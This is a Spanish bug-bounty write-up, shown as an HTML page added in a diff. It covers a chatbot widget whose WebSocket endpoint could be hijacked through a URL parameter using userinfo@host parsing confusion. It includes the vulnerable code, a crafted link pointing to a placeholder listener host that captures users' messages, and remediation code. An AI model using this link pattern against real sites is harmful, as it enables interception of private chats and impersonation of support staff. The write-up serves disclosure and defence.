@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Inyección de endpoint WebSocket mediante un parámetro de URL | ZsZsec</title>
+  <meta name="description" content="Análisis técnico de un chatbot que permitía reemplazar su endpoint WebSocket mediante un parámetro controlado desde la URL." />
+  <meta name="author" content="Santiago Bedoya (ZsZsec)" />
+  <link rel="canonical" href="https://zszsec.github.io/bug-bounty/websocket-endpoint-injection.html" />
+  <meta property="og:title" content="Inyección de endpoint WebSocket mediante un parámetro de URL" />
+  <meta property="og:description" content="Análisis técnico de un chatbot que permitía reemplazar su endpoint WebSocket mediante un parámetro de URL." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://zszsec.github.io/bug-bounty/websocket-endpoint-injection.html" />
+  <meta property="og:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta property="og:image:alt" content="ZsZsec | Security Researcher" />
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="Inyección de endpoint WebSocket mediante un parámetro de URL" />
+  <meta name="twitter:description" content="Un parámetro de URL permitía reemplazar el endpoint WebSocket de un chatbot." />
+  <meta name="twitter:image" content="https://zszsec.github.io/assets/og-cover.png" />
+  <meta name="theme-color" content="#000000" />
+  <link rel="icon" href="../assets/favicon.svg" type="image/svg+xml" />
+  <link rel="stylesheet" href="../assets/style.css" />
+</head>
+<body>
+  <div class="scanline"></div>
+  <header class="site-header">
+    <a class="brand" href="../index.html" aria-label="Inicio"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+    <nav class="nav" aria-label="Navegación principal"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../bug-bounty.html" aria-current="page">Bug Bounty</a><a class="nav-link" href="../writeups.html">Writeups</a></nav>
+  </header>
+  <main>
+    <section class="page-hero compact">
+      <p class="eyebrow">bug bounty / web security</p>
+      <h1>WebSocket injection<span>_</span></h1>
+      <div class="writeup-meta"><span>CWE-15</span><span>Medium</span></div>
+      <div class="tag-row"><span class="tag">Web Security</span><span class="tag">WebSocket</span><span class="tag">URL Parsing</span><span class="tag">Chatbot Security</span></div>
+    </section>
+    <section class="content-shell">
+      <article class="markdown-body">
+        <p>Encontré este comportamiento durante pruebas autorizadas en un programa de bug bounty. El frontend de un chatbot permitía reemplazar parte de la dirección utilizada para abrir su conexión WebSocket mediante un parámetro de la URL.</p>
+
+        <p>El valor llegaba hasta la configuración del transporte sin una allowlist de hosts. Como la URL final se construía mediante concatenación de strings, era posible utilizar la sintaxis <code>userinfo@host</code> para hacer que el navegador se conectara a un servidor diferente del que aparentaba la cadena.</p>
+
+        <blockquote><p>El programa no se identifica. Los parámetros, dominios, estructuras y ejemplos de esta página son sintéticos.</p></blockquote>
+
+        <h2>Ficha técnica</h2>
+
+        <table>
+          <thead><tr><th>Campo</th><th>Detalle</th></tr></thead>
+          <tbody>
+            <tr><td>Categoría</td><td>WebSocket endpoint injection / URL parsing confusion</td></tr>
+            <tr><td>CWE</td><td>CWE-15</td></tr>
+            <tr><td>Criticidad</td><td>Medium</td></tr>
+            <tr><td>Superficie</td><td>Widget de chat conectado mediante WSS</td></tr>
+            <tr><td>Autenticación</td><td>No requerida para preparar el enlace</td></tr>
+            <tr><td>Interacción</td><td>La víctima abre el enlace y utiliza el chat</td></tr>
+          </tbody>
+        </table>
+
+        <h2>El override</h2>
+
+        <p>El widget aceptaba una opción de configuración equivalente a esta:</p>
+
+        <pre><code class="language-json">{
+  "overrides": {
+    "transport_url_parameter": "transport"
+  }
+}</code></pre>
+
+        <p>Durante la carga, el valor del parámetro reemplazaba directamente el path configurado para el canal:</p>
+
+        <pre><code class="language-javascript">const override = query.get("transport");
+
+if (override) {
+  channel.path = override;
+}</code></pre>
+
+        <p>El transporte construía después la URL efectiva concatenando el esquema, el host esperado y ese valor:</p>
+
+        <pre><code class="language-javascript">const socketUrl = "wss://" + trustedHost + channel.path;
+const socket = new WebSocket(socketUrl);</code></pre>
+
+        <p>El código asumía que <code>channel.path</code> siempre comenzaría con <code>/</code>. No lo comprobaba.</p>
+
+        <h2>El problema con <code>@</code></h2>
+
+        <p>En una URL, el texto situado antes de <code>@</code> puede interpretarse como información de usuario. Por ejemplo:</p>
+
+        <pre><code>wss://trusted-chat.example.test@listener.example.test/socket</code></pre>
+
+        <p>A simple vista, la cadena comienza con el dominio esperado. Para el parser del navegador, sin embargo, el hostname real es:</p>
+
+        <pre><code>listener.example.test</code></pre>
+
+        <p>Si el valor controlado comienza con <code>@listener.example.test/socket</code>, la concatenación produce exactamente esa estructura.</p>
+
+        <p>El flujo era:</p>
+
+        <pre><code>parámetro controlado desde la URL
+        ↓
+override del path del canal
+        ↓
+concatenación con "wss://" y el host esperado
+        ↓
+interpretación de userinfo@host
+        ↓
+conexión WebSocket hacia el listener externo</code></pre>
+
+        <h2>Reproducción en un entorno controlado</h2>
+
+        <p>La estructura del enlace se normalizó para este caso:</p>
+
+        <pre><code>https://portal.example.test/support/?transport=@listener.example.test/socket</code></pre>
+
+        <p>Al abrirlo, el widget construía una URL equivalente a:</p>
+
+        <pre><code>wss://portal.example.test@listener.example.test/socket?conversation=&lt;random-id&gt;</code></pre>
+
+        <p>El servidor externo recibía el handshake con el origen de la aplicación legítima. Después de aceptar la conexión, podía observar los mensajes escritos en el widget.</p>
+
+        <p>Para comprobar el flujo inverso, el listener respondió con una estructura genérica admitida por el cliente:</p>
+
+        <pre><code class="language-json">{
+  "type": "message",
+  "data": {
+    "text": "Controlled response"
+  }
+}</code></pre>
+
+        <p>La respuesta se renderizaba dentro del widget. Esto confirmó dos efectos independientes:</p>
+
+        <ol>
+          <li>Los mensajes enviados por el usuario llegaban al servidor externo.</li>
+          <li>El servidor externo podía controlar las respuestas mostradas dentro de la interfaz legítima.</li>
+        </ol>
+
+        <h2>Impacto</h2>
+
+        <p>Una persona podía preparar un enlace que mantuviera la interfaz y el origen visual del sitio legítimo mientras desviaba el canal de comunicación hacia infraestructura externa.</p>
+
+        <p>Si un usuario utilizaba el chat desde ese enlace, sus mensajes podían ser interceptados en tiempo real. Al mismo tiempo, las respuestas del servidor externo aparecían dentro del widget, haciendo posible suplantar al operador o bot esperado.</p>
+
+        <p>El impacto no dependía de comprometer el servidor original. La confianza provenía de la página legítima, mientras que el transporte había sido reemplazado desde el navegador de la víctima.</p>
+
+        <h2>Causa raíz</h2>
+
+        <p>La vulnerabilidad combinaba tres errores:</p>
+
+        <ol>
+          <li>Una opción interna de override estaba expuesta mediante la URL pública.</li>
+          <li>El valor se utilizaba sin validar que fuera únicamente un path relativo.</li>
+          <li>La dirección WebSocket se construía con concatenación de strings en lugar de utilizar un parser de URLs y comprobar el hostname resultante.</li>
+        </ol>
+
+        <h2>Remediación</h2>
+
+        <p>La opción de override no debería estar disponible en producción. Si existe una necesidad legítima, el valor debe limitarse estrictamente a paths relativos:</p>
+
+        <pre><code class="language-regex">^/[a-zA-Z0-9/_-]+$</code></pre>
+
+        <p>La URL debe construirse con la API <code>URL</code> y validarse después del parsing:</p>
+
+        <pre><code class="language-javascript">const target = new URL(relativePath, "wss://chat.example.test");
+
+if (target.hostname !== "chat.example.test") {
+  throw new Error("Unexpected WebSocket host");
+}</code></pre>
+
+        <p>También conviene rechazar credenciales en la URL, esquemas alternativos, protocol-relative URLs y cualquier valor que cambie el origen esperado.</p>
+
+        <h2>Estado del reporte</h2>
+
+        <p>El comportamiento fue reportado al programa y permanece sin resolver.</p>
+      </article>
+    </section>
+  </main>
+  <footer class="site-footer"><span>ZsZsec</span></footer>
+</body>
+</html>
